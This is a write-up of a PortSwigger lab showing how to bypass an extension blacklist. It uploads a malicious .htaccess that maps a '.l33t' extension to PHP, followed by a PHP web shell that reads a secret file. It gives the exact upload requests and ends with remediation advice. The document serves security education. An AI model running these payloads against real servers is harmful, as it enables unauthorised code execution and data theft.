# File Upload Vulnerabilities: Web Shell Upload via Extension Blacklist Bypass

## Platform
PortSwigger Web Security Academy

## Difficulty
Practitioner

## Vulnerability Category
Unrestricted File Upload via Server Misconfiguration (CWE-434)

## Lab Objective
The avatar upload function blocks `.php` uploads via an extension blacklist. Bypass this blacklist — which requires uploading **two separate files** — to achieve remote code execution and exfiltrate `/home/carlos/secret`.

## Vulnerability Overview
Blacklist-based extension filtering is a fundamentally weaker control than allowlisting, because it requires the defender to enumerate every dangerous extension in advance — and web servers recognize far more executable extensions than developers typically account for. This lab demonstrates the most severe version of that weakness: rather than relying on an obscure PHP variant extension slipping through the list, it exploits **Apache's own `.htaccess` mechanism** to redefine which extensions get executed as PHP in the first place, sidestepping the blacklist's assumptions entirely.

Apache (when configured to allow it, as is common on shared or default hosting setups) honours a special configuration file named `.htaccess` placed inside any directory it serves, applying directives scoped to that directory without requiring access to the main server configuration. One such directive, `AddType`, maps a file extension to a MIME type and handler:

```apache
AddType application/x-httpd-php .l33t
```

If an attacker can upload a file *named* `.htaccess` into the same directory as their payload, and the server actually processes it, they can invent an entirely new, blacklist-unaware extension (here, `.l33t`) and tell Apache to treat it as PHP — at which point the blacklist's specific list of "dangerous" extensions becomes irrelevant, since the attacker is no longer using any extension the blacklist was written to catch.

## Methodology
1. **Confirm the blacklist exists and test its boundaries.** Attempt a direct `.php` upload and observe the explicit rejection, confirming extension-based filtering is in place.
2. **Determine whether `.htaccess` itself is uploadable.** Since `.htaccess` has no "dangerous" extension in the traditional sense (it's a configuration file, not a script), it's a strong candidate for slipping past a blacklist that was designed with executable extensions in mind.
3. **Craft a malicious `.htaccess`** that maps an arbitrary, blacklist-safe extension to PHP execution.
4. **Upload the `.htaccess` file first**, placing it in the same directory as the eventual payload.
5. **Upload the web shell using the newly-mapped extension**, which the blacklist has no reason to block since it was never a known-dangerous extension.
6. **Invoke the shell** at its uploaded path to confirm the `.htaccess` mapping took effect.

---

## Exploitation

**Step 1:** Log in as `wiener:peter`. Attempt to upload a standard PHP web shell as the avatar:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

The server responds rejecting the upload, confirming `.php` is blacklisted.

**Step 2:** Craft a malicious `.htaccess` file with the following content, mapping a custom, unlikely-to-be-blacklisted extension to PHP execution:

```apache
AddType application/x-httpd-php .l33t
```

**Step 3:** Send the avatar upload request to **Repeater**. Upload this file with the filename `.htaccess` and, critically, set the part's `Content-Type` to a non-PHP value such as `text/plain` — since the blacklist may also inspect the declared content type, and `.htaccess` has no executable MIME type of its own to trigger suspicion:

```http
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
```

**Step 4:** Send the request. The upload succeeds — `.htaccess` is not on the blacklist, since it isn't an extension associated with script execution under normal assumptions.

**Step 5:** Re-upload the PHP payload, this time with the newly defined extension instead of `.php`:

```http
Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**Step 6:** This upload also succeeds, since `.l33t` was never a recognised dangerous extension to the blacklist.

**Step 7:** Request the uploaded file directly:

```
GET /files/avatars/exploit.l33t
```

**Step 8:** Because the `.htaccess` file uploaded in Step 4 lives in the same directory and Apache honours it, the server now treats `.l33t` files as PHP — the script executes, and the response contains the contents of `/home/carlos/secret`. Submitting this value solves the lab.

**Why it works:** Blacklist filtering operates on a closed, fixed assumption of what counts as "dangerous" — but the actual set of extensions a web server will execute as code is not fixed at all; it's configurable, and in Apache's case, configurable **per-directory by anyone who can write a file into that directory**. The blacklist was never designed to anticipate an attacker redefining the server's own extension-to-handler mapping from within. This turns the vulnerability from "did the blacklist miss an obscure PHP alias" into something far more powerful: the attacker invents their own safe-looking extension and grants it execution rights themselves, with the blacklist never having a chance to recognise the threat at all.

## Impact
- **Full remote code execution**, with an unusually severe bypass mechanism — the attacker isn't working around gaps in the blacklist's knowledge, they're altering the server's own behavior to create a gap that never needed to exist.
- **Demonstrates that extension blacklisting is architecturally unsound**, not just incomplete in this instance — any environment permitting per-directory configuration overrides (`.htaccess`, equivalent IIS `web.config` directives, etc.) alongside unrestricted file uploads is vulnerable to this exact technique regardless of how thorough the blacklist's extension list is.
- **Two-stage attack chain** (configuration file, then payload) means detection or logging focused only on "suspicious file extensions uploaded" would miss the first, enabling stage entirely — `.htaccess` looks completely benign in isolation.

## Remediation
- **Never rely on a blacklist for file upload validation.** Use a strict allowlist of permitted extensions (e.g. `.jpg`, `.png`, `.gif` only), and reject everything else by default, including configuration files like `.htaccess` that have no business being user-uploadable at all.
- **Disable `.htaccess` processing (`AllowOverride None`) in the upload directory**, or equivalent per-directory configuration override mechanisms on other web servers, so uploaded files can never alter server behavior regardless of their name or content.
- **Validate file content, not just name/extension** — reject any uploaded file whose content doesn't match an expected, benign format (e.g. actual image data via magic byte / re-encoding checks), independent of what extension it claims.
- **Store uploads outside the webroot**, or in a location with execution disabled at the web server configuration level, removing the question of extension mapping entirely.
- **Principle of least privilege for the web server process** — it should not have write access to locations where its own configuration can be altered by uploaded content.

## Key Takeaways
- This lab is the clearest demonstration in the entire file-upload series of *why* allowlisting beats blacklisting as a security principle — the attack doesn't find a gap in the list, it rewrites the rules the list depends on.
- `.htaccess` (and equivalent per-directory config files on other platforms) should always be treated as a dangerous upload target, even though it carries no conventional "executable" extension — the danger lies in what it configures, not in itself.
- Requiring two uploaded files to achieve code execution is a reminder that real-world exploitation often isn't a single clever payload — it's a short, deliberate sequence where each step enables the next.
- Server configuration behavior (what extensions get executed, under what conditions) is itself part of the application's attack surface whenever file uploads are permitted into a directory the web server actively serves.

## Tools Used
- Burp Suite (Proxy, Repeater)
- Web browser

## Disclaimer
This writeup documents an intentionally vulnerable lab on PortSwigger Web Security Academy for educational purposes. Only test systems you own or have explicit written permission to assess.